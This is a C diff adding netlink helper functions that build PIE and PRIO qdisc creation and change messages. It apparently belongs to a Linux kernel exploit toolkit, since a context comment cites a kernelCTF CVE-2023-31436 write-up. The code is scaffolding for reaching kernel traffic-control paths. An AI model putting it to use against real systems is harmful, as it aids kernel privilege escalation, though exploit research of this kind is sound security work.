@@ -406,7 +406,71 @@ struct tf_msg *filterAdd(char * name, unsigned short prio, unsigned int flowid, 
     m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
     return m;
 }
+struct tf_msg * pieQdiscAdd(u32 handle, u32 parent, u32 limit,u32 target){
+    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
+    // -> Calling tc_modify_qdisc 
+    init_tf_msg(m);
+    m->nlh.nlmsg_type    = RTM_NEWQDISC;     
+    m->nlh.nlmsg_flags   |= NLM_F_CREATE;
+    m->tcm.tcm_handle    = handle >> 16 << 16;
+    m->tcm.tcm_parent    = parent;
+    
+    // Set TCA_KIND     
+    char name[] = "pie";
+    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen(name) + 1, name));
+    struct rtattr *opts     = (struct rtattr *)((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len));
+    opts->rta_type          = TCA_OPTIONS;
+    opts->rta_len           = RTA_LENGTH(0);
+    opts->rta_len += RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_len, TCA_PIE_LIMIT, sizeof(limit), (char *)&limit));
 
+    opts->rta_len += RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_len, TCA_PIE_TARGET, sizeof(target), (char *)&target));
+
+    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
+
+    return m;
+}
+struct tf_msg *prioQdiscAdd(u32 handle, u32 parent, struct tc_prio_qopt * popt) {
+    struct tf_msg *m = calloc(1, sizeof(struct tf_msg));
+    init_tf_msg(m);
+
+    m->nlh.nlmsg_type  = RTM_NEWQDISC;
+    m->nlh.nlmsg_flags |= NLM_F_CREATE;
+    m->tcm.tcm_handle  = handle >> 16 << 16;
+    m->tcm.tcm_parent  = parent;
+
+    // TCA_KIND = "prio"
+    char name[] = "prio";
+    m->nlh.nlmsg_len += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len),
+                                               TCA_KIND, strlen(name) + 1, name));
+
+    // // TCA_OPTIONS
+    struct rtattr *opts = (struct rtattr *)((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len));
+    opts->rta_type = TCA_OPTIONS;
+    opts->rta_len  = RTA_LENGTH(0);
+    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
+    memcpy((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len),
+                                           popt,sizeof(*popt));
+    opts->rta_len  = RTA_LENGTH(0x14);
+    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
+
+    return m;
+}
+
+struct tf_msg * pieQdiscChange(u32 handle, u32 parent, u32 limit){
+    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
+    // -> Calling tc_modify_qdisc 
+    init_tf_msg(m);
+    m->nlh.nlmsg_type    = RTM_NEWQDISC;     
+    m->nlh.nlmsg_flags |= NLM_F_REPLACE; // Change existing qdisc
+    m->tcm.tcm_handle    = handle >> 16 << 16;
+    m->tcm.tcm_parent    = parent;
+    
+    // Set TCA_KIND     
+    char name[] = "pie";
+    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen(name) + 1, name));
+    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_PIE_LIMIT, 4, (char *)&limit));
+    return m;
+}
 struct tf_msg * netemQdiscAdd(char *name,u32 handle, u32 parent, u32 usec) {
     // Learned from KCTF cve-2023-31436 write up
     // Kernel Handler: function hfsc_init_qdisc
